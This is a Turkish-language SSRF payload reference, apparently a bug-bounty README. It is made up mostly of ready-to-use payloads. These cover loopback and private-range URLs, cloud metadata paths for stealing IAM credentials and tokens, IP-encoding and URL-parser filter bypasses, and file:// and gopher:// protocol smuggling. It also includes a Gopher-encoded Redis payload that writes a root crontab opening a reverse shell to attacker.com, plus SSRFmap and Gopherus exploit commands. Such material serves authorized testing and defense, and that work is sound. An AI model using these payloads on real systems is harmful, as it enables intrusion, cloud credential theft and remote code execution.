# 🌐 SSRF - Sunucu Taraflı İstek Sahteciliği Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Server-Side Request Forgery
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-İç_Ağ_Erişimi-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metaveri_Sızıntısı-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 🎯 SSRF Nedir?

**SSRF (Server-Side Request Forgery)**, saldırganın hedef web sunucusunu kendi adına yetkisiz veya beklenmeyen konumlara (özellikle kurum içi yerel ağa, döngü arayüzüne veya bulut metaveri servislerine) HTTP/ağ istekleri yapmaya zorlaması zafiyetidir.

### Etki Derecesi (Impact)
- 🔴 **İç Ağ Erişimi:** İnternete kapalı iç servisleri ve portları tarama
- 🔴 **Bulut Metaveri İfşası:** AWS, GCP veya Azure IAM gizli anahtarlarını çalma
- 🔴 **Güvenlik Duvarı Atlatma:** DMZ arkasındaki korumalı kaynaklara doğrudan erişim
- 🔴 **Uzaktan Kod Çalıştırma (RCE):** Redis, memcached veya iç admin panelleri üzerinden kod çalıştırma

---

## 🔍 Nerede Aranır?

### Zafiyete Açık Yaygın Parametreler
```
url=, uri=, path=, dest=, redirect=, redirect_uri=, next=
data=, reference=, site=, html=, val=, validate=, domain=
callback=, return=, page=, feed=, host=, port=, to=, out=, view=, dir=
```

### Zafiyet Taşıyan Yaygın Fonksiyonlar
- URL doğrulama ve önizleme araçları
- HTML'den PDF üreten servisler (wkhtmltopdf, Puppeteer)
- Dış kaynaktan resim indirme ve işleme
- Webhook yapılandırmaları
- Dış API ve RSS besleme entegrasyonları
- Web sitesi ekran görüntüsü alma araçları

---

## 💉 Temel SSRF Payload'ları

### Localhost / Döngü Adresleri (Loopback)
```
http://localhost
http://localhost:80
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Özel İç Ağ Blokları (Private IP Ranges)
```
# Class A (10.0.0.0/8)
http://10.0.0.1
http://10.10.10.10

# Class B (172.16.0.0/12)
http://172.16.0.1
http://172.31.255.255

# Class C (192.168.0.0/16)
http://192.168.0.1
http://192.168.1.1

# Link-Local (Bulut Metaveri Adresi)
http://169.254.169.254
```

### İç Ağda Sık Karşılaşılan Kritik Portlar
```
http://127.0.0.1:22    # SSH Servisi
http://127.0.0.1:25    # SMTP (İç posta sunucusu)
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis (Parolasız olabilir!)
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Dahili Web / Tomcat
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁️ Bulut Sağlayıcıları Metaveri Servisleri (Cloud Metadata)

### AWS (Amazon Web Services)
```http
# IMDSv1 Metaveri Servisi (Token gerektirmez)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROL_ADI]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### Google Cloud Platform (GCP)
```http
# Standart GCP Metaveri Uç Noktaları
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Başlık enjeksiyonu gerektiren token sorgusu:
Metadata-Flavor: Google
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Microsoft Azure
```http
# Azure VM Instance Metadata (Metadata: true başlığı ile)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

### DigitalOcean
```http
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡️ Filtre Atlatma (Bypass) Teknikleri

### Farklı IP Temsilleri (IP Encoding)
```
# Ondalık (Decimal) Format:
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Onaltılık (Hex) Format:
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Sekizlik (Octal) Format:
http://0177.0.0.01  # = 127.0.0.1

# Kısaltılmış Format:
http://127.1        # = 127.0.0.1
http://0            # = 0.0.0.0
```

### DNS Rebinding (DNS Yeniden Bağlama)
Hedef uygulama IP kontrolünü istek öncesi yapıyorsa ve DNS TTL süresi kısaysa:
```
# Genel DNS rebinding servisleri:
7f000001.rbndr.us   → 127.0.0.1
1.localtest.me      → 127.0.0.1
spoofed.burpcollaborator.net
```

### URL Ayrıştırma Tutarsızlıkları (URL Parser Exploits)
```
# '@' Karakteri İstismarı:
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com

# Ters Eğik Çizgi (Backslash):
http://attacker.com\127.0.0.1
```

### Protokol Değiştirme (Smuggling)
```
# Yerel dosya okuma (LFI):
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher Protokolü (İkili TCP paketleri göndermek için):
gopher://127.0.0.1:6379/_INFO

# Dict Protokolü:
dict://127.0.0.1:6379/INFO
```

### Açık Yönlendirme (Open Redirect) ile Birleştirme
Eğer uygulama sadece `example.com` alan adına istek atılmasına izin veriyorsa, sitedeki bir açık yönlendirme zafiyeti üzerinden iç ağa yönlendirme yapılabilir:
```
https://example.com/fetch?url=https://example.com/redirect?url=http://169.254.169.254/
```

---

## 🔥 İleri Seviye İstismar: Gopher ile Redis RCE

Hedef sistemde şifresiz bir Redis servisi (Port 6379) varsa, Gopher protokolü ile crontab dosyası yazılarak doğrudan Reverse Shell alınabilir:

```
# Gopherus aracı ile üretilen Redis Cron Payload örneği:
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

---

## 📊 Hızlı Başvuru Tablosu

| Filtre Kuralı | Atlatma Çözümü |
|---------------|----------------|
| `localhost` engelli | `127.0.0.1`, `0`, `127.1`, `[::1]` kullanın |
| `127.0.0.1` engelli | Ondalık format (`2130706433`) veya Hex (`0x7f000001`) deneyin |
| Özel IP blokları engelli | DNS Rebinding servislerini kullanın (`rbndr.us`) |
| Sadece HTTP/HTTPS izinli | Açık yönlendirme (Open Redirect) zinciri kurun |
| Domain beyaz listesi var | `@` hilesini veya alt alan adı çakışmasını deneyin |

---

## 🛠️ Araçlar

```bash
# SSRFmap - Otomatik SSRF tespit ve istismar aracı
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus - SSRF üzerinden RCE yükü üretici (Redis, FastCGI, MySQL vb.)
python gopherus.py --exploit redis

# Blind SSRF Dinleyicileri:
# - Burp Collaborator
# - webhook.site
# - interactsh
```

---

<p align="center">
  <b>🌐 SSRF Zafiyetlerini Tespit Edin ve Altyapınızı Koruyun!</b><br>
  <i>Yalnızca yetkilendirilmiş sistemlerde test yapınız.</i>
</p>
